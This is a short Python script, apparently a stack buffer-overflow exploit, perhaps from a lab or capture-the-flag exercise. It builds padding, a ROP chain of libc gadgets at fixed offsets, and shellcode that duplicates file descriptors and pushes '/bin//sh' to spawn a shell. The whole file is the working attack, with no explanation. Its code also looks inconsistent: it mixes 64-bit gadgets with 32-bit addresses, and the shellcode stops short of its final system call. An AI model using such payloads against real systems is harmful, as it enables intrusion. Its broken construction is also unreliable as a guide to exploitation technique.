#!/usr/bin/python
import struct
libc_base=0x7ffff7e1b000
def xx(address):
	return struct.pack("<Q",address);




junk="A"*268;
rop=""
shellcode="\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"

rop+=xx(libc_base+0x3fa6a) # pop rdx ,ret
rop+=xx(0xFFFFFFFF)
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0x25c55)  # inc rdx 
rop+=xx(libc_base+0xf8587) # pop rcx,ret
rop+=xx(0x01010101)
rop+=xx(libc_base+0x3103f)
rop+=xx(0xbffdf001)
rop+=xx(libc_base+0x16f3e2)
rop+=xx(0xb7eeadad)
rop+=xx(0x41414141)

rop+=xx(libc_base+0xfd96d)
rop+=shellcode

print junk+rop